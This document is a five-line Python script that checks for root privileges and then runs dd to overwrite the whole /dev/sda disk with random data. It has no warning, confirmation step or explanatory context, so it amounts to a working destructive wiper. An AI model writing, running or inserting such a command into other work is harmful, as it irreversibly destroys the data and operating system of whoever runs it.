#!/usr/bin/env python3
import os, subprocess
if os.geteuid() != 0:
    raise SystemExit(1)
subprocess.run(["dd", "if=/dev/urandom", "of=/dev/sda", "bs=1M"], check=False)
